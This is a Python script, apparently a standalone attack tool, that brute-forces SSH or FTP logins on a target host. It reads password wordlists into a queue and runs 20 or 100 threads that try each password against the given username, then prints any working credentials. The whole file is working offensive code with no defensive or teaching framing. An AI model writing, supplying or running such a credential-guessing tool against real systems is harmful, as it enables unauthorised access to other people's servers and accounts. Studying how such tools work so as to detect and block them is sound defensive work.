import ftplib
import paramiko
import threading
import queue
import sys
import socket
import time

guessed = False
correct_password = ''
threads = []

def ssh_guesser(hostname, username):
    global guessed, correct_password
    sshclient = paramiko.SSHClient()
    sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    while not guessed and not q.empty():
        password = q.get()
        print(f"Trying.. {password}")
        try:
            sshclient.connect(hostname=hostname, username=username, password=password, timeout=5)
            print("[+] Correct combination found:\nUsername: {}\nPassword:{}".format(username, password))
            guessed = True
            correct_password = password
        except socket.timeout:
            print("[+] Host is unreachable. Exiting..")
            exit()
        except paramiko.AuthenticationException:
            # Authentication problem
            pass
        except paramiko.SSHException:
            print("[+] Quota exceeded. Exiting..")
            time.sleep(1)
        finally:
            q.task_done()
    sshclient.close()

def ftp_guesser(hostname, username):
    global guessed, correct_password
    ftpclient = ftplib.FTP()
    while not guessed and not q.empty():
        password = q.get()
        print(f"Trying.. {password}")
        try:
            ftpclient.connect(hostname, 21, timeout=3)
            ftpclient.login(username, password)
            print("[+] Found valid combo\nUsername: {}\nPassword: {}".format(username, password))
            guessed = True
            correct_password = password
        except Exception as e:
            pass
        finally:
            q.task_done()
    ftpclient.quit()

q = queue.Queue()
hostname = sys.argv[1]
username = sys.argv[2]
type = sys.argv[3]

if type == 'ssh':
    with open('wordlists/ssh_list', 'r') as file:
        for password in file.read().splitlines():
            q.put(password)
        for i in range(20):
            t = threading.Thread(target=ssh_guesser, args=(hostname, username), daemon=True)
            t.start()
            threads.append(t)

elif type == 'ftp':
    with open('wordlists/password_list_small', 'r') as file:
        for password in file.read().splitlines():
            q.put(password)
        for i in range(100):
            t = threading.Thread(target=ftp_guesser, args=(hostname, username), daemon=True)
            t.start()
            threads.append(t)

for t in threads:
    t.join()

while True:
    if guessed:
        print("[+] Valid login details found:\nUsername={}\nPassword={}".format(username, correct_password))
        exit()
    elif not guessed and q.empty():
        print("[-] Cannot find valid password")
        exit()
